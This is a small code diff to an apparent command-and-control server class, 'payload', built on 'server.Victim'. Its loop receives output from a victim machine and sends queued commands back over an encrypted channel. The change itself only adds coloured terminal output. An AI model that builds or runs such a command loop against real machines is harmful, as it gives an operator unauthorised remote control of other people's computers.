@@ -10,9 +10,9 @@ class payload(server.Victim):
      #   self.secure_send(bytearray(b'hello world'),11)
      #   self.secure_send(bytearray(b'hello world this is the server'),30)
         while True:
-            print(str(self.secure_recv().decode()))
+            print( '\033[91m' +str(self.secure_recv().decode() + '\033[0m')) 
             command = str(self.getCommandFromQueue())
-            print(command)
+            print('\33[32m'+command + '\33[0m')
             self.secure_send(command.encode(),len(command.encode()))
 if __name__ == "__main__":
     server.run(payload)
